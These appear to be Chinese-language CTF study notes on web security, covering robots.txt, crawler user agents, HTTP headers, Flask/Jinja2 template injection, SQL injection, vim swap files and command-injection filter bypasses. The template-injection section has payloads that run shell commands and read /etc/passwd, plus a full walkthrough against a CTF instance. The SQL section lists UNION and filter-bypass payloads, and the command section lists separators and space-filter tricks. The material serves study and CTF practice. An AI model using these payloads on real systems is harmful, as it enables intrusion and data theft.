# WEB notes

## robots.txt

**robots.txt**是一种存放于**网站根目录下**的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称**爬虫**），此网站中的哪些内容是**不应被搜索引擎的漫游器获取的**，哪些是**可以被漫游器获取**的。

这个协议也不是一个规范，而只是**约定俗成**的，有些搜索引擎会遵守这一规范，有些则不然。

## Google 用户代理令牌\(User-agent\)

| 抓取工具 | 用户代理令牌（产品令牌） | 完整的用户代理字符串 |
| :--- | :--- | :--- |
| [**APIs-Google**](https://support.google.com/webmasters/answer/7426684) | `APIs-Google` | `APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)` |
| [**AdSense**](https://support.google.com/adsense/answer/99376) | `Mediapartners-Google` | `Mediapartners-Google` |
| [**AdsBot Mobile Web Android**](https://support.google.com/google-ads/answer/2404197)（检查 Android 网页广告质量） | `AdsBot-Google-Mobile` | `Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)` |
| [**AdsBot Mobile Web**](https://support.google.com/google-ads/answer/2404197)（检查 iPhone 网页广告质量） | `AdsBot-Google-Mobile` | `Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)` |
| [**AdsBot**](https://support.google.com/google-ads/answer/2404197)（检查桌面设备网页广告质量） | `AdsBot-Google` | `AdsBot-Google (+http://www.google.com/adsbot.html`\) |
| [**Googlebot Image**](https://support.google.com/webmasters/answer/35308) | ```Googlebot-Image``Googlebot``` | `Googlebot-Image/1.0` |
| [**Googlebot News**](https://support.google.com/news/publisher-center/answer/9606634) | ```Googlebot-News``Googlebot``` | `Googlebot-News` |
| **Googlebot Video** | ```Googlebot-Video``Googlebot``` | `Googlebot-Video/1.0` |
| [**Googlebot**](https://support.google.com/webmasters/answer/182072)（桌面版） | `Googlebot` | `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html`\) `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z‡ Safari/537.36`  或（很少使用）：  `Googlebot/2.1 (+http://www.google.com/bot.html`\) |
| [**Googlebot**](https://support.google.com/webmasters/answer/182072)（智能手机版） | `Googlebot` | `Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/*W.X.Y.Z*‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)` |
| [**Mobile AdSense**](https://support.google.com/adsense/answer/99376) | `Mediapartners-Google` | （各类移动设备）\(`compatible; Mediapartners-Google/2.1`; `+http://www.google.com/bot.html`\) |
| [**Mobile Apps Android**](https://support.google.com/google-ads/answer/2404197)（检查 Android 应用页面广告质量。遵守 AdsBot-Google 漫游器规则。） | `AdsBot-Google-Mobile-Apps` | `AdsBot-Google-Mobile-Apps` |
| [**Feedfetcher**](https://support.google.com/webmasters/answer/178852) | `FeedFetcher-Google`不遵循 robots.txt 规则 - [查看原因](https://support.google.com/webmasters/answer/178852#robots) | `FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)` |
| [**Google Read Aloud**](https://support.google.com/webmasters/answer/9274005) | `Google-Read-Aloud`不遵循 robots.txt 规则 - [查看原因](https://support.google.com/webmasters/answer/9274005#robots) | 现用代理： `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)`曾用代理（已弃用）： `google-speakr` |
| [**Duplex on the Web**](https://support.google.com/webmasters/answer/9467408) | `DuplexWeb-Google`可能会忽略 \* 用户代理通配符 - [查看原因](https://support.google.com/webmasters/answer/9467408#control-crawling) | `Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012; DuplexWeb-Google/1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Mobile Safari/537.36` |
| **Google Favicon**（检索各种服务的网站元素） | `Google Favicon`对于用户发起的请求，会忽略 robots.txt 规则 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon` |
| [**Web Light**](https://support.google.com/webmasters/answer/6211428) | `googleweblight`不遵循 robots.txt 规则 - [查看原因](https://support.google.com/webmasters/answer/6211428#robots) | `Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19` |

## View-source

显示指定资源的源代码，在右键无法用的时候可以在url的最前面输入`view-source:`来查看网页源代码。

## Referer请求头

`Referer` 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 `Referer` 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。

在以下两种情况下，`Referer` 不会被发送：

* 来源页面采用的协议为表示本地文件的 "file" 或者 "data" URI；
* 当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）。

## X-Forwarded-For

**X-Forwarded-For**:简称**XFF头**，它代表客户端，也就是HTTP的请求端**真实的IP**，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。

> 标准格式如下：
>
> X-Forwarded-For: client1, proxy1, proxy2
>
> 从标准格式可以看出，X-Forwarded-For头信息可以有多个，中间用逗号分隔，第一项为真实的客户端ip，剩下的就是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个。

如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：

X-Forwarded-For: IP0, IP1, IP2

Proxy3 直连服务器，它会给 XFF 追加 IP2，表示它是在帮 Proxy2 转发请求。列表中并没有 IP3，IP3 可以在服务端通过 Remote Address 字段获得。我们知道 HTTP 连接基于 TCP 连接，HTTP 协议中没有 IP 的概念，Remote Address 来自 TCP 连接，表示与服务端建立 TCP 连接的设备 IP，在这个例子里就是 IP3。

Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求。不同语言获取 Remote Address 的方式不一样，例如 php 是 $\_SERVER\["REMOTE\_ADDR"\]，Node.js 是 req.connection.remoteAddress，但原理都一样。

## Referer

`Referer` 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 `Referer` 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等

## 模版注入\(SSTI\)

flask模块的渲染方法有render\_template和render\_template\_string两种。

render\_template\(\)是用来渲染一个指定的文件的

```python
return render_tmplate('index.html')
```

Render\_template\_string用来渲染一个字符串，SSTI与这个方法有关系。

```python
html = '<h1>This is index page</h1>'
return render_template_string(html)
```

flask是使用Jinja2来作为渲染引擎的。

在网站的根目录下新建`templates`文件夹，这里是用来存放html文件，也就是模板文件。

模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。

`{{}}`在Jinja2中作为变量包裹标识符，不仅可以传递变量，还可以执行一些简单的表达式。

不正确的使用flask中的`render_template_string`方法会引发SSTI。

python的几个魔术方法

* `__class__`  python中的新式类（即显示继承object对象的类）都有一个属性 `__class__` 用于获取当前实例对应的类，例如 `"".__class__` 就可以获取到字符串实例对应的类
* `__mro__`    python中类对象的 **mro** 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序
* `__base__` 返回该对象所继承的基类

  // **base**和**mro**都是用来寻找基类的

* `__subclasses__` python的新式类都保留了它所有的子类的引用，`__subclasses__()` 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。
* `__init__`  类的初始化方法
* `__globals__`  保存了函数所有的所有全局变量，在利用中，可以使用 `__init__` 获取对象的函数，并通过 `__globals__` 获取 file、os 等模块以进行下一步的利用

**查找可用的payload**

```python
index = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    try:
        if 'os' in item.__init__.__globals__:
            print(index, item)
        index += 1
    except:
        index += 1
# 396 <class 'http.cookiejar.Cookie'>
# 399 <class 'http.cookiejar.CookieJar'>

# ''.__class__.__mro__[-1].__subclasses__()[396].__init__.__globals__['os'].system('ls')
```

**测试用例**

Flask/Jinja2

* `{{ config }}`
* `{{ config.items() }}`
* `{{get_flashed_messages.__globals__['current_app'].config}}`
* `{{''.__class__.__mro__[-1].__subclasses__()}}`
* `{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}`
* `{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`

**常见payload**

* `().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()`
* `().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )`

**预防**

将传入可控参数的地方加上变量包裹符`{{}}`，即可防止表达式执行。

```python
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
```

以一个题为例，题目来自于攻防世界的Web\_python\_template\_injection

```php
http://220.249.52.133:52133/{{7*7}}
# 返回下面的结果，可以看到7*7被执行了
# URL http://220.249.52.133:52133/49 not found

http://220.249.52.133:52133/{{''.__class__}}
# ''.__class__ 返回空字符串的类型
# URL http://220.249.52.133:52133/<type 'str'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__}}
# 返回了当前类和继承的基类，这里我们选择object类
# URL http://220.249.52.133:52133/(<type 'str'>, <type 'basestring'>, <type 'object'>) not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2]}}
# URL http://220.249.52.133:52133/<type 'object'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__}}
# 提示我们__subclasses__是一个内置方法，所以需要加括号执行
# URL http://220.249.52.133:52133/<built-in method __subclasses__ of type object at 0x8f8740> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()}}
# object的子类太多，就不列举了，我们找到了file
# URL http://220.249.52.133:52133/[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>...] not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71]}}
# URL http://220.249.52.133:52133/<class 'site._Printer'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__}}
# URL http://220.249.52.133:52133/{'traceback': <module 'traceback' from '/usr/lib/python2.7/traceback.pyc'>, 'setencoding': <function setencoding at 0x7fabe2ab3410>, 'sethelper': <function sethelper at 0x7fabe2ab3230>, 'execsitecustomize': <function execsitecustomize at 0x7fabe2ab3488>...}

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os']}}
# URL http://220.249.52.133:52133/<module 'os' from '/usr/lib/python2.7/os.pyc'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
# URL http://220.249.52.133:52133/['fl4g', 'index.py'] not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[40]}}
# URL http://220.249.52.133:52133/<type 'file'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[40]('./fl4g').read()}}
# URL http://220.249.52.133:52133/ctf{f22b6844-5169-4054-b2a0-d95b9361cb57} not found
```

## SQL注入

手工注入步骤：

1.判断是否存在注入，注入是字符型还是数字型

2.猜解SQL查询语句中的字段数

3.确定显示的字段顺序

4.获取当前数据库

5.获取数据库中的表

6.获取表中的字段名

7.下载数据

GROUP\_CONCAT\(\)函数将组中的字符串连接成为具有各种选项的单个字符串。

MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中，要求字段数一致。

```sql
注入常见参数 
user()：当前数据库用户
database()：当前数据库名
version()：当前使用的数据库版本
@@datadir：数据库存储数据路径
concat()：联合数据，用于联合两条数据结果。如 concat(username,password)
group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,password)，用于把多条数据一次注入出来
concat_ws()：用法类似
hex() 和 unhex()：用于 hex 编码解码
load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\
select xxoo into outfile '路径'：权限较高时可直接写文件

行间注释 
'-- '   --后面有个空格
DROP sampletable;--
url里空格会被浏览器直接处理掉，就到不了数据库里。所以特意用加号代替。
#
DROP sampletable;#
```

```sql
?id=1'  回显空白 -> 可能为单引号闭合
?id=1'--+ 回显正常 -> 单引号闭合方式
?id=1' and 1=1--+ 回显空白 -> 可能过滤了and
?id=1' And 1=1--+ 回显空白 -> 可能过滤了大小写
?id=1' anandd 1=1--+ 回显正常 -> 嵌套剥离绕过 过滤了and、or
?id=1' oorrder by 3--+ ->列数为3

?id=-1' uniunionon selselectect 1,group_concat(schema_name),3 from infoorrmation_schema.schemata--+
?id=-1' uniunionon selecselectt 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema='web18'--+
?id=-1' uniunionon selecselectt 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name='flag'--+
?id=-1' uniunionon selecselectt 1,flag,3 from flag--+


?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='web18'--+
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'--+
?id=-1' union select 1,flag,3 from flag--+
```

## vim备份文件

**临时文件 file.swp**

非正常关闭vim编辑器（直接关闭终端、电脑断电等），都会生成一个用于备份缓冲区内容的**临时文件**——`.swp`文件。它记录了用户在非正常关闭vim编辑器之前未能及时保存的修改，用于文件恢复。并且**多次意外退出并不会覆盖旧的.swp文件**，而是会生成一个新的，例如.swo文件。

**备份文件file~**

默认情况下，**备份文件**的名称是在原始文件名最后加上“~”后缀。例如，正在编辑一个名为“data.txt”的文件，那么Vim将产生名为“data.txt~”的备份文件。

## 命令执行绕过

**通配符**

`?`：匹配任何**一个**字符，需要知道文件名的长度

```bash
$ cat f???
flag{123}
```

`*`：匹配全部字符

```bash
$ cat *
flag{123}
```

`[]`：一个范围

```bash
[abc]  // 匹配abc之中的任意一个字符
[a-z]  // 匹配a到z中的任意一个字符
$ cat fl[a-c]g
flag{123}
```

`{..}`：生产序列，以逗号分隔，且不能有空格

```bash
$ touch {a..d}
$ ls 
a b c d

$ touch{1,2}
$ ls
1 2

$ {cat,flag}
flag{123}

$ echo {{A..Z},{a..z}}
A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z
```

`{...}`与`[...]`有一个很重要的区别。如果匹配的文件不存在，`[...]`会失去模式的功能，变成一个单纯的字符串，而`{...}`依然可以展开。

```bash
$ ls [ab].txt
ls: [ab].txt: No such file or directory

$ ls {a,b}.txt
ls: a.txt: No such file or directory
ls: b.txt: No such file or directory
```

**命令分隔于执行多条命令**

Unix

```bash
%0a
%0d
;
&
|
$(shell_command)`shell_command`{shell_command,}
```

Windows

```bash
%0a
&
|
%1a - 一个神奇的角色，作为.bat文件中的命令分隔符
```

**空格过滤**

`${IFS}`：IFS是internal field separator的缩写，shell的特殊环境变量

```bash
$ cat${IFS}flag
flag{123}

$ cat$IFS$9flag  （使$IFS被当成一个整体，cat$IFSflag会把$IFSflag当成一个变量）
flag{123}
```

`<>file`：以读写模式打开文件（默认情况下在文件描述符0（stdin）上，如`<`），不会被截断，如果file不存在，则会创建文件。

```bash
$ cat<flag
flag{123}

$ cat<>flag #需要写权限
flag{123}
```

